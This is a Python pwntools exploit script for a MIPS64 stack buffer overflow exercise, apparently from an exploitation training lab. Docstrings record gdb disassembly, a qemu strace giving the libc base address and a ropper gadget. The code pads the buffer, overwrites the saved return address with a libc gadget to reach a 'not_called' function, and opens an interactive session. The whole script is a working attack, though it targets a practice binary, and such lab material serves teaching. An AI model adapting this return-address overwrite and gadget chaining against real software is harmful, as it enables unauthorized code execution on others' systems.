#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000120000c70 <+0>:	daddiu	sp,sp,-160
   0x0000000120000c74 <+4>:	sd	ra,152(sp)
...
   0x0000000120000ce8 <+120>:	ld	ra,152(sp)
   0x0000000120000cec <+124>:	ld	s8,144(sp)
   0x0000000120000cf0 <+128>:	ld	gp,136(sp)
   0x0000000120000cf4 <+132>:	daddiu	sp,sp,160
   0x0000000120000cf8 <+136>:	jr	ra
   0x0000000120000cfc <+140>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x120000c90: file src/02-overwrite-ret.c, line 11.
(gdb) b *0x0000000120000ce8
Breakpoint 2 at 0x120000ce8: file src/02-overwrite-ret.c, line 16.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:11
11		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd60 ""
(gdb) p/x $sp+152
$2 = 0x40007ffdf8
"""

"""
$ qemu-mips64 -L /usr/mips64-linux-gnuabi64/ -strace ./bin/mips64/02-overwrite-ret
...
6035 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
6035 mmap(NULL,1880864,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x000000400085e000
"""

"""
ropper --nocolor --file /usr/mips64-linux-gnuabi64/lib/libc-2.27.so
0x000000000017a500: ld $t9, 8($sp); jalr $t9; nop;
...
"""

import struct
import sys

from pwn import *

context(arch='mips64', os='linux', endian='big', word_size=64)

binary_path = './bin/mips64/02-overwrite-ret'

ra_saved_addr = 0x40007ffdf8
buffer_addr = 0x40007ffd60
libc_addr = 0x000000400085e000

ld_t9_jump_t9_addr = libc_addr + 0x000000000017a500

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p64(ld_t9_jump_t9_addr)
payload += 'b' * 8
payload += p64(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
